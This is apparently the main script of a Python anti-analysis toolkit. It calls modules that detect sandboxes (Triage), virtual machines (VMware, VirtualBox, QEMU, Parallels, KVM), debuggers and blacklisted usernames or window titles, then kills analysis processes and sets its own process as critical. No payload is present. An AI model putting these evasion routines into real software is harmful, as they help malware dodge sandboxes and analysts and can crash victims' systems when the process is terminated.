## ANTI DEBUGGING
from AntiDebug.CheckBlacklistedWindowsNames import CheckTitles
from AntiDebug.CheckInternetConnection import check_connection
from AntiDebug.IsDebuggerPresent import is_debugger_present
from AntiDebug.RemoteDebugger import CheckRemoteDebugger
from AntiDebug.KillBadProcesses import KillBadProcesses
from AntiDebug.ParentAntiDebug import ParentAntiDebug
from AntiDebug.ComputerUptime import CheckUptime
## ANTI VIRTULIZATION
from AntiVirtulization.TriageCheck import TriageCheck
from AntiVirtulization.USBCheck import PluggedIn
from AntiVirtulization.UsernameCheck import CheckForBlacklistedNames
from AntiVirtulization.VMArtifacts import VMArtifactsDetect
from AntiVirtulization.VMWareDetection import GraphicsCardCheck as VMWareGraphicsCardCheck
from AntiVirtulization.VirtualboxDetection import GraphicsCardCheck as VirtualboxGraphicsCardCheck
from AntiVirtulization.QEMUCheck import CheckForQEMU
from AntiVirtulization.ParallelsCheck import CheckForParallels
from AntiVirtulization.MonitorMetrics import IsScreenSmall 
from AntiVirtulization.KVMCheck import CheckForKVM 
from AntiVirtulization.RecentFileActivity import RecentFileActivityCheck

## Program Utilities
from CriticalProcess.SetProcessIsCritical import set_process_critical

def main():
    ## ANTI VIRTULIZATION CHECKS ARE BELOW
    triage_result = TriageCheck()
    if triage_result:
        print("[DEBUG CHECK] Triage was detected")
    else:
        print("[DEBUG CHECK] Triage Wasnt Detected.")

    rec_file_result, _ = RecentFileActivityCheck()
    if rec_file_result:
        print("[DEBUG CHECK] Recent File Activity was detected.")
    else:
        print("[DEBUG CHECK] No recent file activity detected.")

    usb_result = PluggedIn()
    if usb_result:
        print("[DEBUG CHECK] USB devices were plugged in.")
    else:
        print("[DEBUG CHECK] No USB devices were plugged in.")

    username_result = CheckForBlacklistedNames()
    if username_result:
        print("[DEBUG CHECK] Current username is blacklisted.")
    else:
        print("[DEBUG CHECK] Current username is not blacklisted.")

    vm_result = VMArtifactsDetect()
    if vm_result:
        print("[DEBUG CHECK] VM artifacts detected.")
    else:
        print("[DEBUG CHECK] No VM artifacts detected.")

    vmware_result = VMWareGraphicsCardCheck()
    if vmware_result:
        print("[DEBUG CHECK] VMware graphics card detected.")
    else:
        print("[DEBUG CHECK] No VMware graphics card detected.")

    virtualbox_result = VirtualboxGraphicsCardCheck()
    if virtualbox_result:
        print("[DEBUG CHECK] VirtualBox graphics card detected.")
    else:
        print("[DEBUG CHECK] No VirtualBox graphics card detected.")
    
    qemu_result, qemu_drivers = CheckForQEMU()
    if qemu_result:
        print(f"[DEBUG CHECK] QEMU components detected: {', '.join(qemu_drivers)}")
    else:
        print("[DEBUG CHECK] No QEMU components detected.")

    parallels_result, _ = CheckForParallels()
    if parallels_result:
        print("[DEBUG CHECK] Parallels components detected.")
    else:
        print("[DEBUG CHECK] No Parallels components detected.")
    
    screen_small_result, _ = IsScreenSmall()
    if screen_small_result:
        print("[DEBUG CHECK] Screen size is considered small.")
    else:
        print("[DEBUG CHECK] Screen size is not considered small.")

    kvm_result, _ = CheckForKVM()
    if kvm_result:
        print("[DEBUG CHECK] KVM components detected.")
    else:
        print("[DEBUG CHECK] No KVM components detected.")

    if set_process_critical():
        print("[DEBUG CHECK] Process set as critical.")
    else:
        print("[DEBUG CHECK] Failed to set process as critical, admin permissions arent present.")




    # ANTI DEBUGGING TECHNIQUES ARE BELOW
    if CheckTitles():  # Call CheckTitles directly
        print("[DEBUG CHECK] Blacklisted Windows Name detected.")
    else:
        print("[DEBUG CHECK] No Presence Of Blacklisted Window Name.")

    connected, error = check_connection()
    if connected:
        print("[DEBUG CHECK] Internet connection is available.")
    else:
        print(f"[DEBUG CHECK] Internet connection check failed. Error: {error}")

    if is_debugger_present():
        print("[DEBUG CHECK] IsDebuggerPresent is present.")
    else:
        print("[DEBUG CHECK] IsDebuggerPresent is not present.")

    if CheckRemoteDebugger():
      print("[DEBUG CHECK] RemoteDebugger is present.")
    else:
     print("[DEBUG CHECK] RemoteDebugger is not present.")


    if ParentAntiDebug():
        print("[DEBUG CHECK] Parent process is not explorer.exe or cmd.exe")
    else:
        print("[DEBUG CHECK] Parent process is explorer.exe or cmd.exe")

    duration = 1200  # Check if uptime is less than 20 minutes (1200 seconds)
    is_less_than_duration, error = CheckUptime(duration)
    if error:
        print(f"[DEBUG CHECK] Error occurred: {error}")
    else:
        if is_less_than_duration:
            print(f"[DEBUG CHECK] System uptime is less than {duration} seconds.")
        else:
            print(f"[DEBUG CHECK] System uptime is equal to or greater than {duration} seconds.")

    KillBadProcesses()

if __name__ == "__main__":
    main()
    input()